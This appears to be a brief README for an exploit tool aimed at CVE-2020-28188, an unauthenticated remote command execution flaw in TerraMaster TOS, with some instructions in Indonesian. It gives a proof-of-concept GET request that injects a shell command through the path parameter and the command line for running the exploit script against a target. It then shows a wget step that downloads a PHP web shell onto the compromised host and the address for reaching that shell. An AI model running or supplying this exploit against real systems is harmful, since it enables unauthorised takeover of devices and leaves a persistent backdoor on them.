# RCE_TOS
Unauthenticated Remote Command Execution 
CVE-2020-28188
Vulnerable page: /include/makecvs.php
Vulnerable parameter: Event
Proof of Concept:
GET /tos/index.php?explorer/pathList&path=%60touch%20/tmp/file%60 HTTP/1.1

# Cara Menggunakan
pip install requests <br>
python3 RCE.PY --url target.com:8181

# Upload Shell<br>
<code>
  wget https://raw.githubusercontent.com/linuxsec/indoxploit-shell/master/shell-v3.php
</code>

akses shell : http://target.com/shell.php
